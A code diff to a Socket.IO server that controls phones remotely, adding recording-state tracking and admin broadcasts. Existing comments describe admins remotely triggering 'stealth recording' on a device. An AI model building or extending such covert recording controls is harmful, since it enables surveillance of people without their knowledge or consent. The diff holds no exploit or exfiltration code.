@@ -94,19 +94,24 @@ io.on('connection', (socket) => {
   });
 
   // Device periodic heartbeat (every 20s from phone)
-  socket.on('device-heartbeat', async ({ deviceId, batteryLevel }) => {
+  socket.on('device-heartbeat', async ({ deviceId, batteryLevel, isRecording }) => {
     if (!deviceId) return;
     const now = new Date();
     const dev = connectedDevices.get(deviceId);
     if (dev) {
       dev.lastSeen = now;
       if (batteryLevel !== undefined) dev.batteryLevel = batteryLevel;
+      if (isRecording !== undefined) dev.isRecording = Boolean(isRecording);
     }
 
     try {
       await Device.findOneAndUpdate(
         { deviceId },
-        { lastSeen: now, ...(batteryLevel !== undefined ? { batteryLevel } : {}) }
+        {
+          lastSeen: now,
+          ...(batteryLevel !== undefined ? { batteryLevel } : {}),
+          ...(isRecording !== undefined ? { isRecording: Boolean(isRecording) } : {}),
+        }
       );
     } catch (e) {
       // ignore
@@ -116,6 +121,7 @@ io.on('connection', (socket) => {
       deviceId,
       lastSeen: now,
       batteryLevel,
+      isRecording: Boolean(isRecording),
       isOnline: true,
     });
   });
@@ -190,15 +196,32 @@ io.on('connection', (socket) => {
   });
 
   // Admin remotely triggers stealth recording on phone
-  socket.on('start-remote-recording', ({ deviceId }) => {
+  socket.on('start-remote-recording', async ({ deviceId }) => {
     console.log(`⏺️ Remote recording requested for: ${deviceId}`);
+    try {
+      await Device.findOneAndUpdate({ deviceId }, { isRecording: true });
+    } catch (e) {}
     io.to(`device_${deviceId}`).emit('start-remote-recording');
+    io.to('admins').emit('device-recording-status', { deviceId, isRecording: true });
   });
 
   // Admin remotely stops stealth recording on phone
-  socket.on('stop-remote-recording', ({ deviceId }) => {
+  socket.on('stop-remote-recording', async ({ deviceId }) => {
     console.log(`⏹️ Remote recording stop requested for: ${deviceId}`);
+    try {
+      await Device.findOneAndUpdate({ deviceId }, { isRecording: false });
+    } catch (e) {}
     io.to(`device_${deviceId}`).emit('stop-remote-recording');
+    io.to('admins').emit('device-recording-status', { deviceId, isRecording: false });
+  });
+
+  // Device notifies recording started or stopped (via hardware buttons or app UI)
+  socket.on('device-recording-status', async ({ deviceId, isRecording }) => {
+    console.log(`📡 Device ${deviceId} recording state changed: ${isRecording}`);
+    try {
+      await Device.findOneAndUpdate({ deviceId }, { isRecording: Boolean(isRecording) });
+    } catch (e) {}
+    io.to('admins').emit('device-recording-status', { deviceId, isRecording: Boolean(isRecording) });
   });
 
   // Disconnect handler
